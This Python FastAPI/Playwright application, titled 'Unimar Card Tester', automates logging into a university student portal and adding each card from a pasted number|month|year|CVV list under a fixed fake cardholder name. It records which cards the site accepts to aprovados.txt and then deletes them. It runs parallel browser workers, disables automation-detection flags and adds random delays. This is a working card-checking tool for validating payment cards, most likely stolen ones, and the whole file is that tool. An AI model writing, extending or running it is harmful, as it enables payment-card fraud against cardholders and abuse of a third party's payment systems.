import asyncio
import os
import random
import time
from contextlib import asynccontextmanager
from pathlib import Path
from typing import Set

import uvicorn
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
from fastapi.responses import HTMLResponse
from pydantic import BaseModel, field_validator
from playwright.async_api import async_playwright, Browser, BrowserContext, Page

# ===================== CONFIG =====================
class Config:
    URL_LOGIN = os.getenv("UNIMAR_URL_LOGIN", "https://digital.unimar.br/login")
    URL_MEUS_CARTOES = os.getenv("UNIMAR_URL_CARTOES", "https://digital.unimar.br/areadoaluno/conta/meuscartoes")
    
    EMAIL = os.getenv("UNIMAR_EMAIL")
    SENHA = os.getenv("UNIMAR_SENHA")
    NOME_FIXO = os.getenv("UNIMAR_NOME", "Bruna Mendes")
    
    SESSAO_PATH = Path("sessao_unimar.json")
    SESSAO_MAX_AGE = 86400  # 24 horas
    
    MAX_TENTATIVAS = int(os.getenv("UNIMAR_MAX_TENTATIVAS", "3"))
    MAX_CANAIS = int(os.getenv("UNIMAR_MAX_CANAIS", "6"))
    
    VIEWPORT = {"width": 1280, "height": 720}
    
    USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
    
    HEADLESS = os.getenv("UNIMAR_HEADLESS", "true").lower() == "true"
    
    BROWSER_ARGS = [
        "--no-sandbox",
        "--disable-dev-shm-usage",
        "--disable-gpu",
        "--disable-web-security",
        "--disable-features=IsolateOrigins,site-per-process",
        "--disable-blink-features=AutomationControlled",
        "--disable-setuid-sandbox",
        "--no-first-run",
        "--no-zygote",
        "--disable-extensions",
    ]

# ===================== ESTADO =====================
class EstadoManager:
    def __init__(self):
        self._lock = asyncio.Lock()
        self._data = {
            "rodando": False,
            "cancelado": False,
            "clients": set(),
            "total_cartoes": 0,
            "processados": 0,
            "aprovados": 0,
            "fila_vazia": False,
            "tarefas_concluidas": 0,
            "inicio_timestamp": 0,
            "canais_ativos": 0,
        }
    
    def get(self, key: str):
        return self._data.get(key)
    
    async def set(self, key: str, value):
        async with self._lock:
            self._data[key] = value
    
    async def increment(self, key: str, delta: int = 1):
        async with self._lock:
            self._data[key] += delta
            return self._data[key]
    
    async def decrement(self, key: str, delta: int = 1):
        async with self._lock:
            self._data[key] -= delta
            return self._data[key]
    
    async def add_client(self, client):
        async with self._lock:
            self._data["clients"].add(client)
    
    async def remove_client(self, client):
        async with self._lock:
            self._data["clients"].discard(client)
    
    async def get_clients(self) -> Set:
        async with self._lock:
            return self._data["clients"].copy()

estado = EstadoManager()

# ===================== HELPERS =====================
def log(mensagem: str):
    """Log simples com timestamp."""
    timestamp = time.strftime("%H:%M:%S")
    full_msg = f"[{timestamp}] {mensagem}"
    print(full_msg)
    # Agendar broadcast sem await
    try:
        asyncio.create_task(broadcast("log", {"mensagem": full_msg}))
    except:
        pass

async def broadcast(type: str, data: dict = None):
    """Envia mensagem para todos os clientes WebSocket."""
    if data is None:
        data = {}
    message = {"type": type, **data}
    
    clients = await estado.get_clients()
    dead = set()
    
    for client in clients:
        try:
            await client.send_json(message)
        except Exception:
            dead.add(client)
    
    for client in dead:
        await estado.remove_client(client)

# ===================== VALIDATION =====================
class IniciarRequest(BaseModel):
    lista: str
    canais: int = 4
    
    @field_validator('canais')
    @classmethod
    def validar_canais(cls, v):
        if v < 1 or v > Config.MAX_CANAIS:
            raise ValueError(f'Canais deve ser entre 1 e {Config.MAX_CANAIS}')
        return v
    
    @field_validator('lista')
    @classmethod
    def validar_lista(cls, v):
        if not v.strip():
            raise ValueError('Lista de cartões não pode estar vazia')
        return v

# ===================== LIFESPAN =====================
@asynccontextmanager
async def lifespan(app: FastAPI):
    # Startup
    print("=" * 50)
    print("🚀 Unimar Card Tester iniciando...")
    print(f"📧 Email configurado: {'Sim' if Config.EMAIL else 'Não'}")
    print(f"🔑 Senha configurada: {'Sim' if Config.SENHA else 'Não'}")
    print("=" * 50)
    
    # Criar diretórios necessários
    Path("templates").mkdir(exist_ok=True)
    Config.SESSAO_PATH.touch(exist_ok=True)
    Path("aprovados.txt").touch(exist_ok=True)
    
    yield
    
    # Shutdown
    print("👋 Aplicação finalizada")

# Criar app
app = FastAPI(title="Unimar Card Tester", lifespan=lifespan)

# ===================== WEBSOCKET =====================
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    await estado.add_client(websocket)
    
    try:
        # Enviar estado atual
        await websocket.send_json({
            "type": "status",
            "rodando": estado.get("rodando"),
            "total": estado.get("total_cartoes"),
            "processados": estado.get("tarefas_concluidas"),
            "aprovados": estado.get("aprovados"),
            "canais_ativos": estado.get("canais_ativos")
        })
    except:
        await estado.remove_client(websocket)
        return
    
    try:
        while True:
            data = await websocket.receive_json()
            if data.get("type") == "pong":
                continue
    except WebSocketDisconnect:
        pass
    except Exception:
        pass
    finally:
        await estado.remove_client(websocket)

# ===================== PLAYWRIGHT FUNCTIONS =====================
async def sessao_e_valida(playwright) -> bool:
    """Verifica se a sessão salva ainda é válida."""
    if not Config.SESSAO_PATH.exists():
        return False
    
    if time.time() - Config.SESSAO_PATH.stat().st_mtime > Config.SESSAO_MAX_AGE:
        return False
    
    try:
        browser = await playwright.chromium.launch(
            headless=Config.HEADLESS,
            args=Config.BROWSER_ARGS
        )
        context = await browser.new_context(
            viewport=Config.VIEWPORT,
            user_agent=Config.USER_AGENT
        )
        page = await context.new_page()
        
        await page.goto(Config.URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=15000)
        await asyncio.sleep(0.8)
        
        valida = await page.get_by_role("button", name="Adicionar Cartão de Crédito").count() > 0
        
        await context.close()
        await browser.close()
        return valida
    except Exception as e:
        print(f"[AVISO] Erro ao validar sessão: {e}")
        return False

async def limpar_cartoes_antigos(page: Page):
    """Remove cartões existentes antes de iniciar."""
    try:
        log("[Faxina] Iniciando limpeza...")
        await page.goto(Config.URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000)
        await asyncio.sleep(1.5)
        
        removidos = 0
        
        for _ in range(50):  # Máximo 50 iterações
            if estado.get("cancelado"):
                break
            
            botoes = page.get_by_role("button", name="Remover")
            if await botoes.count() == 0:
                break
            
            botao = botoes.first
            try:
                await botao.scroll_into_view_if_needed(timeout=3000)
                await botao.click(force=True)
                await asyncio.sleep(0.5)
                removidos += 1
            except:
                break
        
        log(f"[Faxina] {removidos} cartão(ões) removido(s).")
    except Exception as e:
        log(f"[Faxina] Erro: {e}")

async def login_mestre(playwright) -> bool:
    """Realiza login no sistema."""
    try:
        # Verificar sessão rápida
        if await sessao_e_valida(playwright):
            log("[Autenticação] Sessão reutilizada (Modo Fast).")
            return True
        
        # Login completo
        log("[Autenticação] Login mestre (Modo Full)...")
        
        if not Config.EMAIL or not Config.SENHA:
            log("[ERRO] Email ou senha não configurados!")
            return False
        
        browser = await playwright.chromium.launch(
            headless=Config.HEADLESS,
            args=Config.BROWSER_ARGS
        )
        context = await browser.new_context(
            viewport=Config.VIEWPORT,
            user_agent=Config.USER_AGENT
        )
        page = await context.new_page()
        page.on("dialog", lambda dialog: asyncio.create_task(dialog.accept()))
        
        await page.goto(Config.URL_LOGIN, wait_until="domcontentloaded", timeout=60000)
        await page.get_by_role("textbox", name="E-mail ou CPF").fill(Config.EMAIL)
        await page.get_by_role("textbox", name="Senha").fill(Config.SENHA)
        await page.get_by_role("button", name="Entrar").click()
        
        await page.wait_for_selector("text=Meus Cartões", timeout=30000)
        
        await limpar_cartoes_antigos(page)
        await context.storage_state(path=str(Config.SESSAO_PATH))
        
        await context.close()
        await browser.close()
        
        log("[Autenticação] Login concluído!")
        return True
    except Exception as e:
        log(f"[ERRO] Login falhou: {e}")
        return False

async def worker_contexto(id_worker: int, browser: Browser, fila: asyncio.Queue):
    """Worker que processa cartões."""
    await estado.increment("canais_ativos")
    await broadcast("status", {"canais_ativos": estado.get("canais_ativos")})
    
    context = None
    page = None
    
    try:
        await asyncio.sleep(id_worker * 1.2)
        log(f"[Canal {id_worker}] Iniciando...")
        
        context = await browser.new_context(
            storage_state=str(Config.SESSAO_PATH),
            viewport=Config.VIEWPORT,
            user_agent=Config.USER_AGENT
        )
        page = await context.new_page()
        page.on("dialog", lambda dialog: asyncio.create_task(dialog.accept()))
        
        await page.goto(Config.URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000)
        await asyncio.sleep(0.8)
        
        while estado.get("rodando") and not estado.get("cancelado"):
            try:
                item = await asyncio.wait_for(fila.get(), timeout=2.0)
            except asyncio.TimeoutError:
                if fila.empty() and estado.get("tarefas_concluidas") >= estado.get("total_cartoes"):
                    break
                continue
            
            indice, linha, tentativa = item
            resultado = "timeout"
            deve_contar = True
            
            try:
                partes = [x.strip() for x in linha.split("|")]
                if len(partes) != 4:
                    log(f"[Canal {id_worker}][Item {indice}] ❌ Formato inválido")
                    fila.task_done()
                    await estado.increment("tarefas_concluidas")
                    await broadcast("reprovado", {"cartao": linha})
                    continue
                
                numero, mes, ano, cvv = partes
                log(f"[Canal {id_worker}][Item {indice}] ****{numero[-4:]}")
                
                # Navegar e preencher formulário
                await page.goto(Config.URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000)
                await asyncio.sleep(random.uniform(0.4, 1.0))
                
                btn_add = page.get_by_role("button", name="Adicionar Cartão de Crédito")
                await btn_add.click(force=True)
                await asyncio.sleep(0.5)
                
                await page.get_by_role("textbox", name="Número do cartão").fill(numero)
                await page.get_by_role("textbox", name="Nome impresso no cartão").fill(Config.NOME_FIXO)
                await page.get_by_label("Mês").select_option(mes)
                await page.get_by_label("Ano").select_option(ano)
                await page.get_by_role("textbox", name="CVV").fill(cvv)
                
                botoes_antes = await page.get_by_role("button", name="Remover").count()
                await page.get_by_role("button", name="Registrar Cartão de Crédito").click(force=True)
                
                # Detectar resultado
                for _ in range(40):
                    if not estado.get("rodando") or estado.get("cancelado"):
                        resultado = "cancelado"
                        break
                    
                    botoes_atual = await page.get_by_role("button", name="Remover").count()
                    if botoes_atual > botoes_antes:
                        resultado = "aprovado"
                        break
                    
                    try:
                        body = (await page.locator("body").inner_text()).lower()
                        erros = ["inválida", "recusado", "erro", "não foi possível"]
                        if any(x in body for x in erros):
                            resultado = "reprovado"
                            break
                    except:
                        pass
                    
                    await asyncio.sleep(0.5)
                
                # Processar resultado
                if resultado == "aprovado":
                    log(f"[Canal {id_worker}][Item {indice}] ✅ APROVADO")
                    await broadcast("aprovado", {"cartao": linha})
                    await estado.increment("aprovados")
                    with open("aprovados.txt", "a") as f:
                        f.write(f"{linha}\n")
                
                elif resultado == "reprovado":
                    log(f"[Canal {id_worker}][Item {indice}] ❌ Reprovado")
                    await broadcast("reprovado", {"cartao": linha})
                
                elif resultado == "timeout":
                    if tentativa < Config.MAX_TENTATIVAS:
                        log(f"[Canal {id_worker}][Item {indice}] ⚠️ Timeout - Retentativa {tentativa + 1}")
                        await fila.put((indice, linha, tentativa + 1))
                        deve_contar = False
                    else:
                        log(f"[Canal {id_worker}][Item {indice}] ❌ Timeout máximo")
                        await broadcast("reprovado", {"cartao": linha})
            
            except Exception as e:
                print(f"[ERRO] Canal {id_worker} Item {indice}: {e}")
                await broadcast("reprovado", {"cartao": linha})
            
            finally:
                fila.task_done()
                if deve_contar:
                    await estado.increment("tarefas_concluidas")
                    
                    elapsed = time.time() - estado.get("inicio_timestamp") if estado.get("inicio_timestamp") else 0
                    velocidade = estado.get("tarefas_concluidas") / (elapsed / 60) if elapsed > 0 else 0
                    
                    await broadcast("progresso", {
                        "processados": estado.get("tarefas_concluidas"),
                        "total": estado.get("total_cartoes"),
                        "aprovados": estado.get("aprovados"),
                        "velocidade": round(velocidade, 1),
                        "tempo": round(elapsed),
                    })
    
    except Exception as e:
        print(f"[ERRO FATAL] Canal {id_worker}: {e}")
    finally:
        if context:
            try:
                await context.close()
            except:
                pass
        await estado.decrement("canais_ativos")
        await broadcast("status", {"canais_ativos": estado.get("canais_ativos")})
        log(f"[Canal {id_worker}] Finalizado")

async def processar_cartoes(texto_cartoes: str, num_canais: int):
    """Processa lista de cartões."""
    try:
        linhas = list(dict.fromkeys([l.strip() for l in texto_cartoes.splitlines() if l.strip()]))
        
        if not linhas:
            log("[ERRO] Nenhum cartão fornecido.")
            return
        
        await estado.set("total_cartoes", len(linhas))
        await estado.set("tarefas_concluidas", 0)
        await estado.set("aprovados", 0)
        await estado.set("cancelado", False)
        await estado.set("inicio_timestamp", time.time())
        
        num_canais = min(max(num_canais, 1), Config.MAX_CANAIS, len(linhas))
        
        log(f"[Sistema] Iniciando com {num_canais} canais e {len(linhas)} cartões")
        
        fila = asyncio.Queue()
        for idx, linha in enumerate(linhas, 1):
            await fila.put((idx, linha, 1))
        
        async with async_playwright() as pw:
            if not await login_mestre(pw):
                log("[ERRO] Falha na autenticação. Abortando.")
                return
            
            browser = await pw.chromium.launch(
                headless=Config.HEADLESS,
                args=Config.BROWSER_ARGS
            )
            
            try:
                tasks = [
                    asyncio.create_task(worker_contexto(i, browser, fila))
                    for i in range(1, num_canais + 1)
                ]
                await asyncio.gather(*tasks, return_exceptions=True)
                
                # Faxina final
                if estado.get("aprovados") > 0 and not estado.get("cancelado"):
                    log("[Sistema] Faxina final...")
                    try:
                        ctx = await browser.new_context(
                            storage_state=str(Config.SESSAO_PATH),
                            viewport=Config.VIEWPORT,
                            user_agent=Config.USER_AGENT
                        )
                        pg = await ctx.new_page()
                        pg.on("dialog", lambda d: asyncio.create_task(d.accept()))
                        await limpar_cartoes_antigos(pg)
                        await ctx.close()
                    except Exception as e:
                        log(f"[Faxina Final] Erro: {e}")
            
            finally:
                await browser.close()
    
    except Exception as e:
        log(f"[ERRO CRÍTICO] {e}")
    finally:
        await estado.set("rodando", False)
        await estado.set("cancelado", False)
        await estado.set("canais_ativos", 0)
        log("[Sistema] Processamento concluído!")
        await broadcast("status", {"rodando": False, "canais_ativos": 0})

# ===================== ROTAS =====================
@app.post("/api/iniciar")
async def iniciar(data: IniciarRequest):
    if estado.get("rodando"):
        return {"status": "já_em_execucao"}
    
    await estado.set("rodando", True)
    await estado.set("cancelado", False)
    await broadcast("status", {"rodando": True})
    
    asyncio.create_task(processar_cartoes(data.lista, data.canais))
    
    return {"status": "iniciado"}

@app.post("/api/parar")
async def parar():
    await estado.set("rodando", False)
    await estado.set("cancelado", True)
    log("⛔ Interrupção solicitada.")
    await broadcast("status", {"rodando": False})
    return {"status": "parando"}

@app.get("/api/status")
async def get_status():
    elapsed = time.time() - estado.get("inicio_timestamp") if estado.get("inicio_timestamp") else 0
    velocidade = estado.get("tarefas_concluidas") / (elapsed / 60) if elapsed > 0 else 0
    
    return {
        "rodando": estado.get("rodando"),
        "total": estado.get("total_cartoes"),
        "processados": estado.get("tarefas_concluidas"),
        "aprovados": estado.get("aprovados"),
        "canais_ativos": estado.get("canais_ativos"),
        "velocidade": round(velocidade, 1),
        "tempo": round(elapsed),
    }

@app.get("/api/health")
async def health():
    return {"status": "ok"}

@app.get("/", response_class=HTMLResponse)
async def index():
    try:
        with open("templates/index.html", encoding="utf-8") as f:
            return f.read()
    except FileNotFoundError:
        return """
        <html>
            <head><title>Unimar Card Tester</title></head>
            <body style="background:#111;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;">
                <div style="text-align:center">
                    <h1>🚀 Unimar Card Tester</h1>
                    <p>API Online</p>
                    <p style="color:#666">Frontend não encontrado. Acesse <code>/docs</code> para documentação.</p>
                </div>
            </body>
        </html>
        """

# ===================== STARTUP =====================
if __name__ == "__main__":
    # Railway define a porta via variável PORT
    PORT = int(os.getenv("PORT", "8000"))
    HOST = "0.0.0.0"  # Obrigatório para Railway
    
    print(f"\n{'='*50}")
    print(f"🚀 Iniciando servidor...")
    print(f"📍 Host: {HOST}")
    print(f"🔌 Porta: {PORT}")
    print(f"📊 Health Check: http://{HOST}:{PORT}/api/health")
    print(f"{'='*50}\n")
    
    # Verificar variáveis obrigatórias
    if not Config.EMAIL or not Config.SENHA:
        print("⚠️  ATENÇÃO: Credenciais não configuradas!")
        print("   Configure UNIMAR_EMAIL e UNIMAR_SENHA no Railway")
    
    # Iniciar servidor
    uvicorn.run(
        app,  # Passar o objeto app diretamente
        host=HOST,
        port=PORT,
        log_level="info"
    )
